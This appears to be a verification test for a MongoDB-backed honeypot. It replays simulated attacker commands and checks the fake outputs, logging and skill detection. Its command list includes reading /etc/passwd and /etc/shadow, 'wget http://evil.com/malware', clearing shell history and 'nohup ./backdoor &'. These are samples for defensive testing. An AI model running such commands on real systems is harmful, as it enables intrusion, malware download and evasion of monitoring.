import os
import json
import time
from honeypot import HoneypotSession
from database import get_db


def run_test():
    print("[*] Starting Honeypot Verification (MongoDB)...")

    # Cleanup previous test data from MongoDB
    db = get_db()
    db.commands.delete_many({"source_ip": "192.168.1.100"})
    print("[*] Cleaned previous test data from MongoDB")

    session = HoneypotSession(client_ip="192.168.1.100", username="admin")

    test_commands = [
        ("whoami", "admin"),
        ("id", "uid=1000(admin)"),
        ("ls", "deploy.sh"),
        ("cat /etc/passwd", "root:x:0:0"),
        ("cat /etc/shadow", "Permission denied"),
        ("ps aux", "mysqld"),
        ("netstat -an", "0.0.0.0:22"),
        ("uptime", "load average"),
        ("sudo whoami", "root"),
        ("wget http://evil.com/malware", "Saving to: 'malware'"),
        ("unset HISTFILE", ""),
        ("export TMOUT=0", ""),
        ("nohup ./backdoor &", "")
    ]

    failed = False
    for cmd, expected in test_commands:
        print(f"[*] Testing: {cmd}")
        output = session.handle_command(cmd)
        if expected in output:
            print(f"  [+] Passed")
        else:
            print(f"  [-] FAILED. Expected '{expected}' in output:")
            print(f"      Got: {output.strip()}")
            failed = True

    # End session to trigger MongoDB save
    summary = session.end_session()

    # Check MongoDB logs
    print("[*] Verifying MongoDB logs...")
    logs = list(db.commands.find({"source_ip": "192.168.1.100"}))

    if not logs:
        print("  [-] No log entries found in MongoDB!")
        failed = True
    else:
        print(f"  [+] Found {len(logs)} log entries in MongoDB")

        # Check skill detection
        high_skill_entry = next(
            (l for l in logs if "nohup" in l.get("command", {}).get("raw_input", "")),
            None
        )
        if high_skill_entry:
            skill = high_skill_entry["behavior_analysis"]["skill_level"]
            print(f"  [+] Skill Level for 'nohup': {skill}")
            if skill == "High":
                print("  [+] Dynamic Deception Engine: Verified (High usage detected)")
            else:
                print("  [-] Dynamic Deception Engine: Failed (Did not detect High skill)")
        else:
            print("  [-] Could not find log entry for 'nohup'")
            failed = True

    # Check session was saved
    print("[*] Verifying session in MongoDB...")
    session_doc = db.sessions.find_one({"session_id": session.session_id})
    if session_doc:
        print(f"  [+] Session saved: {session_doc['session_id']}")
        print(f"      Commands: {session_doc['total_commands']}, Skill: {session_doc['final_skill_level']}")
    else:
        print("  [-] Session not found in MongoDB!")
        failed = True

    # Check session replay was saved
    replay_doc = db.session_replays.find_one({"session_id": session.session_id})
    if replay_doc:
        print(f"  [+] Session replay saved with {len(replay_doc.get('transcript', []))} interactions")
    else:
        print("  [-] Session replay not found in MongoDB!")
        failed = True

    if failed:
        print("\n[-] Verification FAILED.")
    else:
        print("\n[+] Verification SUCCESSFUL. All data stored in MongoDB!")


if __name__ == "__main__":
    run_test()
